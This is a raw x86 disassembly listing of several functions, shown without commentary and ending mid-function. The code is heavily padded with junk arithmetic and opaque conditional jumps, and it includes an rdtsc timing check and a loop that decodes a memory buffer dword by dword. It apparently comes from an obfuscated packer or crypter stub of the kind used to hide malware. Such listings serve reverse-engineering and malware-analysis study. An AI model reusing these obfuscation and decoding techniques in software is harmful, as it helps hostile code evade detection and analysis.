  42563c:	sub    ecx,ebx
  42563e:	and    ecx,esi
  425640:	sub    DWORD PTR [ebp-0x2c],ecx
  425643:	sub    eax,edx
  425645:	add    eax,ebx
  425647:	cmp    eax,DWORD PTR [ebp-0x30]
  42564a:	je     0x4256c1
  42564c:	cmp    esi,0x391d
  425652:	je     0x4256c1
  425654:	add    eax,edx
  425656:	mov    esi,DWORD PTR [ebp-0x2c]
  425659:	cmp    edi,DWORD PTR ds:0x438070
  42565f:	je     0x4256c1
  425661:	add    eax,edi
  425663:	sub    DWORD PTR [ebp-0x14],eax
  425666:	sub    esi,edi
  425668:	and    esi,eax
  42566a:	xor    edx,edx
  42566c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42566f:	cmp    esi,0x9f0d
  425675:	jne    0x4256c1
  425677:	mov    edx,DWORD PTR [ebp-0x2c]
  42567a:	mov    ebx,DWORD PTR [ebp-0x2c]
  42567d:	cmp    esi,edx
  42567f:	je     0x4256c1
  425681:	cmp    edx,esi
  425683:	jne    0x4256c1
  425685:	cmp    ecx,0xffffffd7
  425688:	je     0x4256c1
  42568a:	sub    esi,edx
  42568c:	sub    ecx,edi
  42568e:	mov    eax,DWORD PTR [ebp-0x14]
  425691:	or     ecx,ebx
  425693:	sub    ecx,esi
  425695:	mov    edx,DWORD PTR ds:0x438084
  42569b:	add    eax,ecx
  42569d:	cmp    eax,edx
  42569f:	jne    0x4256c1
  4256a1:	cmp    eax,DWORD PTR ds:0x438070
  4256a7:	jne    0x4256c1
  4256a9:	mov    esi,DWORD PTR ds:0x438040
  4256af:	sub    edx,ecx
  4256b1:	xor    ebx,ebx
  4256b3:	and    DWORD PTR [ebp-0x2c],eax
  4256b6:	add    DWORD PTR [ebp-0x14],ebx
  4256b9:	add    DWORD PTR [ebp-0x14],edx
  4256bc:	add    esi,ecx
  4256be:	sub    DWORD PTR [ebp-0x14],esi
  4256c1:	mov    ebx,DWORD PTR [ebp-0x28]
  4256c4:	add    esi,ecx
  4256c6:	add    DWORD PTR [ebp-0x14],esi
  4256c9:	mov    DWORD PTR [edi+0x0],ebx
  4256cc:	cmp    ecx,0xa
  4256cf:	jne    0x425735
  4256d1:	cmp    edx,0xfb520782
  4256d7:	je     0x425735
  4256d9:	mov    edi,0x6eb6
  4256de:	mov    ecx,DWORD PTR [ebp-0x14]
  4256e1:	add    ecx,ebx
  4256e3:	cmp    edx,0xffffffbd
  4256e6:	jne    0x425735
  4256e8:	mov    edx,DWORD PTR ds:0x4380b0
  4256ee:	add    DWORD PTR [ebp-0x14],edx
  4256f1:	mov    eax,0x86
  4256f6:	sub    eax,edx
  4256f8:	cmp    ecx,DWORD PTR [ebp-0x44]
  4256fb:	je     0x425735
  4256fd:	mov    eax,0xe9
  425702:	mov    edx,DWORD PTR [ebp-0x14]
  425705:	sub    edx,eax
  425707:	xor    DWORD PTR [ebp-0x2c],ecx
  42570a:	sub    edx,esi
  42570c:	and    edx,edi
  42570e:	sub    DWORD PTR [ebp-0x14],ecx
  425711:	cmp    edx,0x11
  425714:	jne    0x425735
  425716:	add    edx,edx
  425718:	cmp    edx,0xffffffd1
  42571b:	jne    0x425735
  42571d:	mov    edi,DWORD PTR [ebp-0x2c]
  425720:	xor    esi,esi
  425722:	xor    DWORD PTR [ebp-0x2c],esi
  425725:	mov    DWORD PTR [ebp-0x2c],edi
  425728:	test   edx,0x9e
  42572e:	je     0x425735
  425730:	and    edx,esi
  425732:	add    DWORD PTR [ebp-0x14],edx
  425735:	mov    eax,DWORD PTR [ebp-0x2c]
  425738:	sub    eax,ebx
  42573a:	and    DWORD PTR [ebp-0x14],eax
  42573d:	pop    edi
  42573e:	add    ecx,eax
  425740:	and    ecx,eax
  425742:	mov    eax,ebx
  425744:	sub    DWORD PTR [ebp-0x14],eax
  425747:	cmp    edi,DWORD PTR ds:0x4380b0
  42574d:	jne    0x4257d3
  425753:	mov    esi,DWORD PTR [ebp-0x2c]
  425756:	mov    ebx,DWORD PTR [ebp-0x14]
  425759:	sub    DWORD PTR [ebp-0x2c],ecx
  42575c:	sub    DWORD PTR [ebp-0x2c],edi
  42575f:	cmp    esi,DWORD PTR [ebp-0x24]
  425762:	jne    0x4257d3
  425764:	add    DWORD PTR [ebp-0x14],esi
  425767:	sub    ebx,edx
  425769:	and    ebx,esi
  42576b:	mov    esi,DWORD PTR ds:0x43807c
  425771:	test   ebx,0xfc
  425777:	jne    0x4257d3
  425779:	xor    edx,edx
  42577b:	sub    DWORD PTR [ebp-0x2c],ebx
  42577e:	sub    esi,ebx
  425780:	sub    DWORD PTR [ebp-0x2c],esi
  425783:	cmp    ebx,ecx
  425785:	je     0x4257d3
  425787:	cmp    eax,DWORD PTR ds:0x438084
  42578d:	jne    0x4257d3
  42578f:	mov    esi,0xc3
  425794:	add    esi,esi
  425796:	mov    ecx,ebx
  425798:	add    DWORD PTR [ebp-0x2c],esi
  42579b:	cmp    ecx,esi
  42579d:	jne    0x4257d3
  42579f:	mov    esi,DWORD PTR [ebp-0x2c]
  4257a2:	sub    DWORD PTR [ebp-0x2c],ecx
  4257a5:	add    esi,edx
  4257a7:	add    esi,edi
  4257a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4257ac:	cmp    esi,ecx
  4257ae:	jne    0x4257d3
  4257b0:	cmp    eax,DWORD PTR ds:0x438050
  4257b6:	jne    0x4257d3
  4257b8:	add    DWORD PTR [ebp-0x14],eax
  4257bb:	cmp    esi,DWORD PTR ds:0x438084
  4257c1:	je     0x4257d3
  4257c3:	test   esi,0x230b10b4
  4257c9:	je     0x4257d3
  4257cb:	xor    ecx,ecx
  4257cd:	add    DWORD PTR [ebp-0x2c],esi
  4257d0:	add    DWORD PTR [ebp-0x2c],ecx
  4257d3:	pop    esi
  4257d4:	mov    ebx,DWORD PTR [ebp-0x2c]
  4257d7:	add    ebx,ecx
  4257d9:	sub    ebx,ecx
  4257db:	add    DWORD PTR [ebp-0x2c],ebx
  4257de:	pop    ebx
  4257df:	or     ecx,esi
  4257e1:	cmp    ebx,DWORD PTR [ebp-0x10]
  4257e4:	jne    0x4257ee
  4257e6:	or     DWORD PTR [ebp-0x2c],edx
  4257e9:	and    ecx,edx
  4257eb:	sub    DWORD PTR [ebp-0x2c],ecx
  4257ee:	leave  
  4257ef:	ret    0x8
  4257f2:	int3   
  4257f3:	int3   
  4257f4:	int3   
  4257f5:	int3   
  4257f6:	int3   
  4257f7:	push   ebp
  4257f8:	mov    ebp,esp
  4257fa:	sub    esp,0x34
  4257fd:	mov    eax,0xf2
  425802:	mov    edx,0x97
  425807:	add    eax,eax
  425809:	mov    DWORD PTR [ebp-0x8],eax
  42580c:	sub    DWORD PTR [ebp-0x8],edx
  42580f:	push   ebx
  425810:	add    DWORD PTR [ebp-0x8],edx
  425813:	push   esi
  425814:	mov    ebx,DWORD PTR [ebp-0x8]
  425817:	cmp    ebx,0x5fa6
  42581d:	je     0x425829
  42581f:	cmp    ebx,0xffffffb2
  425822:	je     0x425829
  425824:	and    ebx,eax
  425826:	and    DWORD PTR [ebp-0x8],ebx
  425829:	push   edi
  42582a:	add    ebx,eax
  42582c:	add    DWORD PTR [ebp-0x8],ebx
  42582f:	test   ebx,0x3f
  425835:	jne    0x425848
  425837:	mov    ecx,DWORD PTR [ebp-0x8]
  42583a:	and    ecx,edx
  42583c:	xor    edi,edi
  42583e:	cmp    ebx,0x7b
  425841:	jne    0x425848
  425843:	and    edi,ecx
  425845:	add    DWORD PTR [ebp-0x8],edi
  425848:	sub    eax,ebx
  42584a:	mov    edx,0x74
  42584f:	mov    edi,0xe3
  425854:	add    eax,edi
  425856:	or     eax,ecx
  425858:	sub    edx,ecx
  42585a:	sub    edx,edi
  42585c:	mov    DWORD PTR [ebp-0x8],edx
  42585f:	and    eax,edx
  425861:	add    eax,edi
  425863:	add    DWORD PTR [ebp-0x8],eax
  425866:	rdtsc  
  425868:	sub    DWORD PTR [ebp-0x8],eax
  42586b:	add    edx,ecx
  42586d:	add    DWORD PTR [ebp-0x8],edx
  425870:	or     edi,ecx
  425872:	cmp    edi,0x51
  425875:	jne    0x425887
  425877:	mov    ecx,DWORD PTR [ebp-0x8]
  42587a:	or     edi,ecx
  42587c:	mov    ebx,DWORD PTR [ebp-0x8]
  42587f:	sub    DWORD PTR [ebp-0x8],edi
  425882:	add    ebx,ecx
  425884:	add    DWORD PTR [ebp-0x8],ebx
  425887:	sub    edi,ebx
  425889:	mov    DWORD PTR [ebp-0x8],edi
  42588c:	pop    edi
  42588d:	sub    ecx,eax
  42588f:	cmp    ecx,0xae9b
  425895:	je     0x425942
  42589b:	cmp    ecx,DWORD PTR [ebp-0x4]
  42589e:	jne    0x425942
  4258a4:	mov    esi,DWORD PTR [ebp-0x8]
  4258a7:	mov    ebx,DWORD PTR [ebp-0x8]
  4258aa:	cmp    edi,DWORD PTR [ebp-0x10]
  4258ad:	jne    0x425942
  4258b3:	add    ebx,edx
  4258b5:	mov    edx,ecx
  4258b7:	mov    ecx,0x45
  4258bc:	and    esi,ecx
  4258be:	sub    esi,edi
  4258c0:	cmp    esi,0x8f93
  4258c6:	je     0x425942
  4258c8:	cmp    ebx,0x39
  4258cb:	je     0x425942
  4258cd:	add    edx,ebx
  4258cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4258d2:	test   ebx,0xd3100002
  4258d8:	je     0x425942
  4258da:	add    edx,edx
  4258dc:	or     esi,ebx
  4258de:	cmp    edx,DWORD PTR [ebp-0x18]
  4258e1:	je     0x425942
  4258e3:	mov    ecx,0x7ff2
  4258e8:	xor    ebx,ebx
  4258ea:	cmp    edx,ebx
  4258ec:	je     0x425942
  4258ee:	sub    DWORD PTR [ebp-0x8],ebx
  4258f1:	xor    ebx,ebx
  4258f3:	cmp    edx,0xaff4
  4258f9:	je     0x425942
  4258fb:	cmp    esi,DWORD PTR [ebp-0x1c]
  4258fe:	jne    0x425942
  425900:	mov    ebx,DWORD PTR [ebp-0x8]
  425903:	mov    ecx,DWORD PTR [ebp-0x8]
  425906:	or     ebx,edx
  425908:	add    ecx,edi
  42590a:	and    esi,ebx
  42590c:	and    esi,edi
  42590e:	and    esi,edi
  425910:	cmp    ecx,DWORD PTR [ebp-0x20]
  425913:	jne    0x425942
  425915:	mov    ebx,0x63
  42591a:	mov    edx,DWORD PTR [ebp-0x8]
  42591d:	add    edx,ebx
  42591f:	add    DWORD PTR [ebp-0x8],edx
  425922:	cmp    esi,edi
  425924:	je     0x425942
  425926:	add    DWORD PTR [ebp-0x8],ecx
  425929:	add    esi,ebx
  42592b:	cmp    esi,0x37
  42592e:	je     0x425942
  425930:	add    esi,edx
  425932:	test   esi,0xac0f
  425938:	jne    0x425942
  42593a:	cmp    esi,0xffffff87
  42593d:	jne    0x425942
  42593f:	add    DWORD PTR [ebp-0x8],esi
  425942:	pop    esi
  425943:	mov    edx,DWORD PTR [ebp-0x8]
  425946:	mov    ecx,DWORD PTR [ebp-0x8]
  425949:	or     edx,esi
  42594b:	sub    DWORD PTR [ebp-0x8],edx
  42594e:	sub    DWORD PTR [ebp-0x8],ecx
  425951:	pop    ebx
  425952:	sub    edx,esi
  425954:	and    edx,ecx
  425956:	mov    DWORD PTR [ebp-0x8],edx
  425959:	leave  
  42595a:	ret    
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	push   ebp
  425961:	mov    ebp,esp
  425963:	sub    esp,0x28
  425966:	xor    ecx,ecx
  425968:	mov    edx,0x6c
  42596d:	add    ecx,ecx
  42596f:	mov    DWORD PTR [ebp-0xc],ecx
  425972:	sub    edx,ecx
  425974:	xor    DWORD PTR [ebp-0xc],edx
  425977:	push   ebx
  425978:	mov    eax,DWORD PTR [ebp-0xc]
  42597b:	add    DWORD PTR [ebp-0xc],eax
  42597e:	push   esi
  42597f:	cmp    eax,edx
  425981:	je     0x42598a
  425983:	cmp    eax,ecx
  425985:	jne    0x42598a
  425987:	add    DWORD PTR [ebp-0xc],ecx
  42598a:	push   edi
  42598b:	add    edx,edx
  42598d:	mov    ebx,0x9097
  425992:	add    DWORD PTR [ebp-0xc],eax
  425995:	mov    esi,DWORD PTR ds:0x4380a8
  42599b:	sub    esi,ebx
  42599d:	sub    DWORD PTR [ebp-0xc],edx
  4259a0:	add    esi,edx
  4259a2:	sub    DWORD PTR [ebp-0xc],esi
  4259a5:	xor    edx,edx
  4259a7:	mov    ecx,DWORD PTR ds:0x438064
  4259ad:	cmp    eax,esi
  4259af:	je     0x4259cf
  4259b1:	mov    eax,DWORD PTR [ebp-0xc]
  4259b4:	mov    ebx,DWORD PTR [ebp-0xc]
  4259b7:	and    DWORD PTR [ebp-0xc],ebx
  4259ba:	add    eax,ecx
  4259bc:	add    eax,ebx
  4259be:	sub    DWORD PTR [ebp-0xc],eax
  4259c1:	add    edx,edx
  4259c3:	sub    edx,ecx
  4259c5:	or     eax,edx
  4259c7:	and    eax,ecx
  4259c9:	mov    DWORD PTR [ebp-0xc],edx
  4259cc:	xor    DWORD PTR [ebp-0xc],eax
  4259cf:	mov    ecx,DWORD PTR [ebp+0x10]
  4259d2:	add    DWORD PTR [ebp-0xc],edx
  4259d5:	mov    edx,DWORD PTR [ebp+0x8]
  4259d8:	sub    DWORD PTR [ebp-0xc],ecx
  4259db:	cmp    DWORD PTR [ebp+0xc],ecx
  4259de:	je     0x425b35
  4259e4:	or     ebx,esi
  4259e6:	mov    eax,DWORD PTR [ebp-0xc]
  4259e9:	add    ebx,edx
  4259eb:	mov    edi,DWORD PTR [ebp-0xc]
  4259ee:	or     edi,eax
  4259f0:	add    edi,eax
  4259f2:	sub    DWORD PTR [ebp-0xc],ebx
  4259f5:	cmp    ebx,0x259e
  4259fb:	je     0x425a32
  4259fd:	xor    esi,esi
  4259ff:	and    esi,ecx
  425a01:	mov    eax,0x73
  425a06:	mov    DWORD PTR [ebp-0xc],edi
  425a09:	sub    esi,edi
  425a0b:	sub    esi,ecx
  425a0d:	cmp    esi,DWORD PTR [ebp-0xc]
  425a10:	je     0x425a32
  425a12:	mov    ebx,edx
  425a14:	mov    DWORD PTR [ebp-0xc],edx
  425a17:	cmp    ebx,ecx
  425a19:	jne    0x425a32
  425a1b:	cmp    edx,ecx
  425a1d:	je     0x425a32
  425a1f:	add    DWORD PTR [ebp-0xc],esi
  425a22:	add    eax,ebx
  425a24:	mov    ebx,eax
  425a26:	xor    edi,edi
  425a28:	add    DWORD PTR [ebp-0xc],edi
  425a2b:	cmp    ebx,esi
  425a2d:	je     0x425a32
  425a2f:	add    DWORD PTR [ebp-0xc],ebx
  425a32:	dec    DWORD PTR [ebp+0xc]
  425a35:	mov    eax,DWORD PTR [ebp-0xc]
  425a38:	xor    edi,edi
  425a3a:	cmp    eax,0x6086
  425a3f:	jne    0x425a75
  425a41:	add    DWORD PTR [ebp-0xc],edi
  425a44:	mov    edi,DWORD PTR [ebp-0xc]
  425a47:	sub    eax,esi
  425a49:	cmp    eax,DWORD PTR ds:0x438064
  425a4f:	je     0x425a75
  425a51:	cmp    eax,0xffffff81
  425a54:	jne    0x425a75
  425a56:	cmp    eax,0xffffffc4
  425a59:	jne    0x425a75
  425a5b:	cmp    edi,DWORD PTR [ebp-0x20]
  425a5e:	je     0x425a75
  425a60:	add    eax,edi
  425a62:	sub    DWORD PTR [ebp-0xc],esi
  425a65:	test   esi,0x11
  425a6b:	jne    0x425a75
  425a6d:	cmp    eax,DWORD PTR [ebp-0x4]
  425a70:	je     0x425a75
  425a72:	add    DWORD PTR [ebp-0xc],eax
  425a75:	sub    DWORD PTR [edx],0xb498dbeb
  425a7b:	mov    edi,0x18
  425a80:	xor    eax,eax
  425a82:	cmp    ebx,DWORD PTR [ebp-0x20]
  425a85:	jne    0x425ad5
  425a87:	mov    eax,DWORD PTR [ebp-0xc]
  425a8a:	cmp    eax,0x948a
  425a8f:	jne    0x425ad5
  425a91:	cmp    ebx,0x56
  425a94:	jne    0x425ad5
  425a96:	or     DWORD PTR [ebp-0xc],ecx
  425a99:	or     eax,ebx
  425a9b:	add    eax,esi
  425a9d:	cmp    ecx,DWORD PTR ds:0x4380a8
  425aa3:	je     0x425ad5
  425aa5:	cmp    ebx,edx
  425aa7:	je     0x425ad5
  425aa9:	mov    edi,DWORD PTR [ebp-0xc]
  425aac:	and    eax,edi
  425aae:	mov    edi,0x5d
  425ab3:	or     DWORD PTR [ebp-0xc],edi
  425ab6:	cmp    eax,0x52
  425ab9:	jne    0x425ad5
  425abb:	mov    edi,DWORD PTR ds:0x438064
  425ac1:	sub    eax,edi
  425ac3:	mov    edi,DWORD PTR [ebp-0xc]
  425ac6:	and    eax,edx
  425ac8:	cmp    edi,0xffffff94
  425acb:	je     0x425ad5
  425acd:	sub    DWORD PTR [ebp-0xc],eax
  425ad0:	sub    edi,esi
  425ad2:	add    DWORD PTR [ebp-0xc],edi
  425ad5:	sub    DWORD PTR [edx],ecx
  425ad7:	mov    edi,DWORD PTR ds:0x438064
  425add:	mov    eax,0xc2
  425ae2:	and    eax,edx
  425ae4:	cmp    eax,DWORD PTR ds:0x4380a8
  425aea:	jne    0x425b0a
  425aec:	add    eax,edx
  425aee:	add    DWORD PTR [ebp-0xc],edi
  425af1:	cmp    eax,DWORD PTR ds:0x438064
  425af7:	je     0x425b0a
  425af9:	cmp    ebx,DWORD PTR ds:0x4380a8
  425aff:	je     0x425b0a
  425b01:	mov    edi,DWORD PTR [ebp-0xc]
  425b04:	or     DWORD PTR [ebp-0xc],edi
  425b07:	sub    DWORD PTR [ebp-0xc],eax
  425b0a:	add    edx,0x4
  425b0d:	mov    edi,DWORD PTR [ebp-0xc]
  425b10:	xor    eax,eax
  425b12:	add    eax,eax
  425b14:	cmp    edx,0x67
  425b17:	jne    0x425b30
  425b19:	test   ebx,0x3a
  425b1f:	jne    0x425b30
  425b21:	cmp    edi,DWORD PTR [ebp-0x4]
  425b24:	jne    0x425b30
  425b26:	or     edi,ecx
  425b28:	sub    eax,esi
  425b2a:	sub    DWORD PTR [ebp-0xc],edi
  425b2d:	sub    DWORD PTR [ebp-0xc],eax
  425b30:	jmp    0x4259d8
  425b35:	mov    edi,DWORD PTR [ebp-0xc]
  425b38:	sub    edx,ecx
  425b3a:	sub    edi,ebx
  425b3c:	mov    ebx,DWORD PTR [ebp-0xc]
  425b3f:	add    ebx,eax
  425b41:	mov    DWORD PTR [ebp-0xc],edx
  425b44:	add    DWORD PTR [ebp-0xc],edi
  425b47:	mov    DWORD PTR [ebp-0xc],ebx
  425b4a:	cmp    ebx,edx
  425b4c:	jne    0x425b56
  425b4e:	cmp    edx,DWORD PTR [ebp-0x1c]
  425b51:	je     0x425b56
  425b53:	mov    DWORD PTR [ebp-0xc],ebx
  425b56:	or     DWORD PTR [ebp-0xc],edi
  425b59:	pop    edi
  425b5a:	mov    ecx,edi
  425b5c:	xor    eax,eax
  425b5e:	sub    DWORD PTR [ebp-0xc],ecx
  425b61:	and    eax,ecx
  425b63:	add    DWORD PTR [ebp-0xc],eax
  425b66:	pop    esi
  425b67:	mov    edx,DWORD PTR [ebp-0xc]
  425b6a:	sub    DWORD PTR [ebp-0xc],esi
  425b6d:	mov    ebx,DWORD PTR ds:0x438064
  425b73:	sub    edx,ecx
  425b75:	and    ebx,esi
  425b77:	cmp    ebx,0x3c
  425b7a:	jne    0x425be3
  425b7c:	mov    eax,DWORD PTR [ebp-0xc]
  425b7f:	sub    DWORD PTR [ebp-0xc],edi
  425b82:	sub    DWORD PTR [ebp-0xc],ebx
  425b85:	xor    ecx,ecx
  425b87:	cmp    eax,esi
  425b89:	je     0x425be3
  425b8b:	mov    ebx,DWORD PTR [ebp-0xc]
  425b8e:	cmp    eax,0x53
  425b91:	je     0x425be3
  425b93:	sub    eax,edx
  425b95:	cmp    eax,DWORD PTR [ebp-0x18]
  425b98:	je     0x425be3
  425b9a:	add    ecx,ecx
  425b9c:	mov    edx,DWORD PTR [ebp-0xc]
  425b9f:	cmp    edx,DWORD PTR ds:0x438064
  425ba5:	jne    0x425be3
  425ba7:	sub    DWORD PTR [ebp-0xc],ebx
  425baa:	sub    DWORD PTR [ebp-0xc],edx
  425bad:	sub    eax,esi
  425baf:	mov    ebx,DWORD PTR ds:0x438064
  425bb5:	mov    edx,DWORD PTR [ebp-0xc]
  425bb8:	add    DWORD PTR [ebp-0xc],ebx
  425bbb:	add    eax,ebx
  425bbd:	sub    edx,edi
  425bbf:	sub    edx,eax
  425bc1:	cmp    edx,DWORD PTR ds:0x4380a8
  425bc7:	je     0x425be3
  425bc9:	mov    eax,DWORD PTR ds:0x438048
  425bcf:	add    ecx,ebx
  425bd1:	add    edx,esi
  425bd3:	mov    ebx,DWORD PTR [ebp-0xc]
  425bd6:	sub    ebx,edx
  425bd8:	sub    ebx,eax
  425bda:	add    DWORD PTR [ebp-0xc],ebx
  425bdd:	add    DWORD PTR [ebp-0xc],edi
  425be0:	sub    DWORD PTR [ebp-0xc],ecx
  425be3:	pop    ebx
  425be4:	cmp    ebx,0x41
  425be7:	je     0x425bfd
  425be9:	cmp    ebx,0x14
  425bec:	jne    0x425bfd
  425bee:	cmp    ebx,edi
  425bf0:	jne    0x425bfd
  425bf2:	mov    edx,0x21
  425bf7:	add    DWORD PTR [ebp-0xc],ebx
  425bfa:	sub    DWORD PTR [ebp-0xc],edx
  425bfd:	leave  
  425bfe:	ret    0xc
  425c01:	int3   
  425c02:	int3   
  425c03:	int3   
  425c04:	int3   
  425c05:	int3   
  425c06:	push   ebp
  425c07:	mov    ebp,esp
  425c09:	sub    esp,0x3c
  425c0c:	mov    edx,0xaf
  425c11:	xor    ecx,ecx
  425c13:	mov    DWORD PTR [ebp-0x8],edx
  425c16:	add    ecx,edx
  425c18:	add    ecx,edx
  425c1a:	mov    DWORD PTR [ebp-0x8],ecx
  425c1d:	push   ebx
  425c1e:	xor    edx,edx
  425c20:	mov    ebx,ecx
  425c22:	sub    DWORD PTR [ebp-0x8],ebx
  425c25:	sub    ecx,edx
  425c27:	and    ecx,ebx
  425c29:	sub    DWORD PTR [ebp-0x8],ecx
  425c2c:	push   esi
  425c2d:	mov    ecx,DWORD PTR [ebp-0x8]
  425c30:	cmp    ecx,DWORD PTR [ebp-0x38]
  425c33:	je     0x425c3f
  425c35:	mov    edx,DWORD PTR [ebp-0x8]
  425c38:	and    edx,ecx
  425c3a:	mov    esi,edx
  425c3c:	add    DWORD PTR [ebp-0x8],esi
  425c3f:	push   edi
  425c40:	mov    edi,DWORD PTR [ebp-0x8]
  425c43:	add    DWORD PTR [ebp-0x8],edx
  425c46:	sub    DWORD PTR [ebp-0x8],edi
  425c49:	and    ebx,edi
  425c4b:	cmp    ebx,DWORD PTR [ebp-0x30]
  425c4e:	je     0x425c7a
  425c50:	and    ebx,edi
  425c52:	mov    eax,DWORD PTR [ebp-0x8]
  425c55:	cmp    ebx,0x9f8
  425c5b:	jne    0x425c7a
  425c5d:	test   eax,0xe1f
  425c62:	jne    0x425c7a
  425c64:	mov    DWORD PTR [ebp-0x8],ebx
  425c67:	and    eax,esi
  425c69:	mov    edx,DWORD PTR [ebp-0x8]
  425c6c:	sub    DWORD PTR [ebp-0x8],edx
  425c6f:	mov    ecx,DWORD PTR [ebp-0x8]
  425c72:	sub    DWORD PTR [ebp-0x8],eax
  425c75:	add    ecx,esi
  425c77:	sub    DWORD PTR [ebp-0x8],ecx
  425c7a:	mov    ecx,0xd82fec27
  425c7f:	mov    eax,DWORD PTR [ebp-0x8]
  425c82:	mov    esi,DWORD PTR [ebp-0x8]
  425c85:	cmp    eax,0xffffffdd
  425c88:	jne    0x425da5
  425c8e:	mov    edx,DWORD PTR [ebp-0x8]
  425c91:	cmp    edx,ebx
  425c93:	jne    0x425da5
  425c99:	or     eax,ebx
  425c9b:	mov    ebx,DWORD PTR ds:0x43808c
  425ca1:	cmp    edx,ecx
  425ca3:	je     0x425da5
  425ca9:	mov    edi,DWORD PTR ds:0x43808c
  425caf:	sub    DWORD PTR [ebp-0x8],edi
  425cb2:	sub    edx,ebx
  425cb4:	sub    DWORD PTR [ebp-0x8],eax
  425cb7:	add    DWORD PTR [ebp-0x8],ebx
  425cba:	cmp    edx,ebx
  425cbc:	jne    0x425da5
  425cc2:	mov    edi,DWORD PTR [ebp-0x8]
  425cc5:	cmp    edx,DWORD PTR ds:0x43808c
  425ccb:	je     0x425da5
  425cd1:	or     DWORD PTR [ebp-0x8],edi
  425cd4:	mov    edi,0xf9
  425cd9:	cmp    esi,DWORD PTR [ebp-0x8]
  425cdc:	jne    0x425da5
  425ce2:	sub    DWORD PTR [ebp-0x8],ecx
  425ce5:	cmp    edx,ecx
  425ce7:	jne    0x425da5
  425ced:	cmp    esi,0xbf1f
  425cf3:	jne    0x425da5
  425cf9:	mov    DWORD PTR [ebp-0xc],edx
  425cfc:	mov    ebx,DWORD PTR [ebp-0xc]
  425cff:	cmp    esi,DWORD PTR [ebp-0x24]
  425d02:	je     0x425da5
  425d08:	mov    edx,0xd9
  425d0d:	sub    ebx,edi
  425d0f:	add    edx,eax
  425d11:	mov    edi,esi
  425d13:	cmp    edi,edx
  425d15:	jne    0x425da5
  425d1b:	add    DWORD PTR [ebp-0x8],esi
  425d1e:	add    edi,eax
  425d20:	xor    esi,esi
  425d22:	cmp    ebx,DWORD PTR [ebp-0x24]
  425d25:	jne    0x425da5
  425d27:	cmp    eax,0x10
  425d2a:	je     0x425da5
  425d2c:	sub    DWORD PTR [ebp-0xc],ebx
  425d2f:	add    esi,eax
  425d31:	mov    ebx,DWORD PTR ds:0x438068
  425d37:	add    ebx,esi
  425d39:	cmp    ebx,edi
  425d3b:	jne    0x425da5
  425d3d:	xor    eax,eax
  425d3f:	mov    esi,0xa9
  425d44:	add    DWORD PTR [ebp-0xc],esi
  425d47:	mov    DWORD PTR [ebp-0x8],eax
  425d4a:	mov    DWORD PTR [ebp-0xc],edi
  425d4d:	or     edx,esi
  425d4f:	cmp    ebx,0x6474
  425d55:	jne    0x425da5
  425d57:	mov    esi,0x528f
  425d5c:	mov    eax,0x4a
  425d61:	sub    DWORD PTR [ebp-0x8],edx
  425d64:	sub    eax,ecx
  425d66:	or     DWORD PTR [ebp-0x8],ebx
  425d69:	add    eax,ebx
  425d6b:	cmp    eax,0x3d
  425d6e:	jne    0x425da5
  425d70:	mov    edx,DWORD PTR [ebp-0xc]
  425d73:	sub    eax,ebx
  425d75:	mov    ebx,DWORD PTR ds:0x43808c
  425d7b:	or     edx,ecx
  425d7d:	add    DWORD PTR [ebp-0x8],eax
  425d80:	and    esi,edi
  425d82:	add    DWORD PTR [ebp-0xc],ebx
  425d85:	cmp    esi,0x3dda
  425d8b:	je     0x425da5
  425d8d:	sub    esi,edx
  425d8f:	xor    eax,eax
  425d91:	mov    edx,ebx
  425d93:	or     DWORD PTR [ebp-0xc],esi
  425d96:	add    eax,ebx
  425d98:	mov    DWORD PTR [ebp-0x8],eax
  425d9b:	or     DWORD PTR [ebp-0x8],edi
  425d9e:	add    edx,edx
  425da0:	and    edx,ebx
  425da2:	sub    DWORD PTR [ebp-0x8],edx
  425da5:	sub    ecx,0xd82febe7
  425dab:	add    eax,eax
  425dad:	add    DWORD PTR [ebp-0x8],ecx
  425db0:	test   esi,0x1f
  425db6:	jne    0x425e33
  425db8:	mov    edx,DWORD PTR [ebp-0x8]
  425dbb:	xor    edi,edi
  425dbd:	sub    edi,esi
  425dbf:	add    edx,ebx
  425dc1:	sub    DWORD PTR [ebp-0x8],eax
  425dc4:	sub    edx,eax
  425dc6:	add    edi,edx
  425dc8:	add    edi,esi
  425dca:	add    edi,ecx
  425dcc:	cmp    edi,DWORD PTR ds:0x438068
  425dd2:	jne    0x425e33
  425dd4:	mov    esi,ecx
  425dd6:	add    edi,eax
  425dd8:	add    esi,ecx
  425dda:	cmp    edi,0xffffffc9
  425ddd:	je     0x425e33
  425ddf:	cmp    edi,0xa05b
  425de5:	je     0x425e33
  425de7:	cmp    edx,DWORD PTR [ebp-0x34]
  425dea:	je     0x425e33
  425dec:	cmp    edi,DWORD PTR ds:0x43808c
  425df2:	jne    0x425e33
  425df4:	mov    ebx,0x96
  425df9:	mov    edx,DWORD PTR [ebp-0x8]
  425dfc:	or     edi,ecx
  425dfe:	add    DWORD PTR [ebp-0x8],edi
  425e01:	add    DWORD PTR [ebp-0x8],edx
  425e04:	sub    DWORD PTR [ebp-0x8],ecx
  425e07:	add    ebx,edi
  425e09:	cmp    ebx,0x4b
  425e0c:	je     0x425e33
  425e0e:	test   ebx,0x88
  425e14:	je     0x425e33
  425e16:	mov    esi,DWORD PTR [ebp-0x8]
  425e19:	and    DWORD PTR [ebp-0x8],esi
  425e1c:	cmp    ebx,DWORD PTR ds:0x43808c
  425e22:	jne    0x425e33
  425e24:	add    ebx,ebx
  425e26:	or     ebx,edx
  425e28:	cmp    ebx,DWORD PTR ds:0x43808c
  425e2e:	jne    0x425e33
  425e30:	sub    DWORD PTR [ebp-0x8],ebx
  425e33:	push   ecx
  425e34:	add    DWORD PTR [ebp-0x8],eax
  425e37:	mov    edi,0x88213f01
  425e3c:	xor    DWORD PTR [ebp-0x8],edi
  425e3f:	add    edi,0x77ded0ff
  425e45:	mov    edx,DWORD PTR ds:0x43808c
  425e4b:	xor    ecx,ecx
  425e4d:	sub    DWORD PTR [ebp-0x8],edx
  425e50:	add    ecx,ecx
  425e52:	and    eax,edx
  425e54:	add    ecx,ebx
  425e56:	cmp    ecx,0xffffffc5
  425e59:	je     0x425e72
  425e5b:	mov    edx,0xe8
  425e60:	add    DWORD PTR [ebp-0x8],ecx
  425e63:	mov    ecx,DWORD PTR [ebp-0x8]
  425e66:	xor    DWORD PTR [ebp-0x8],ecx
  425e69:	and    edx,ecx
